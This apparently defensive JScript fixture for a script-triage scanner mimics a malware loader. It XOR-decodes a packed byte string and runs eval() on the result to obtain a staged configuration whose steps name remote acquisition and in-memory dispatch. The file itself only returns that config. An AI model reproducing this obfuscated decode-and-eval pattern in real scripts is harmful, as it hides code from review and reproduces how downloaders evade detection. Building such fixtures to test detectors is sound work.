// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_76363083 = function(v_a19c) {
  var keyBytes = [180,148,25,135,217];
  var v_b27e = [];
  for (var i = 0; i < v_a19c.length; i++) { v_b27e.push(v_a19c[i] ^ keyBytes[i % keyBytes.length]); }
  return v_b27e;
};
var recover_198e6dfe = function() {
  // configuration reconstruction
  var packedText = "207-182-106-243-188-196-231-59-189-130-150-245-122-246-172-221-230-124-216-171-209-249-118-243-188-150-184-59-227-176-199-228-120-243-186-220-203-116-226-180-219-230-96-165-132-152-182-120-227-184-196-224-124-245-251-142-182-84-238-186-198-251-106-232-191-192-186-65-202-149-252-192-77-215-251-152-182-111-230-181-193-241-106-165-227-207-182-122-230-180-196-245-112-224-183-235-253-125-165-227-150-247-120-234-169-213-253-126-233-244-208-240-47-183-188-131-240-127-230-191-150-184-59-242-171-216-182-35-165-177-192-224-105-244-227-155-187-125-227-239-132-241-46-227-191-213-242-55-226-161-213-249-105-235-188-154-253-119-241-184-216-253-125-168-235-134-160-124-179-184-129-166-55-227-184-192-182-53-165-172-199-241-107-216-184-211-241-119-243-251-142-182-81-242-183-192-230-124-244-170-248-245-123-168-189-208-162-41-226-238-208-242-120-225-251-201-184-59-244-173-213-243-124-196-182-193-250-109-165-227-134-233";
  var packedParts = packedText.split("-");
  var v_a19c = [];
  for (var di = 0; di < packedParts.length; di++) { v_a19c.push(parseInt(packedParts[di], 10)); }
  var v_f602 = ["north", "south"].join(":");
  var v_b27e = [];
  try { v_b27e = decode_76363083(v_a19c); } catch (ignored) { v_b27e = []; }
  var textParts = [], bi = 0;
  for (bi = 0; bi < v_b27e.length; bi++) { textParts.push(String.fromCharCode(v_b27e[bi])); }
  var v_c304 = textParts.join("");
  return v_c304;
  // end reconstruction
};
var inspect_ef6700c4 = function() {
  var v_d41a = eval("(" + recover_198e6dfe() + ")");
  var v_e598 = new Object();
  v_e598.steps = v_d41a.steps;
  v_e598["adapter"] = v_d41a["adapter"];
  v_e598.values = v_d41a.values;
  v_e598["stageCount"] = v_d41a["stageCount"];
  return v_e598;
};
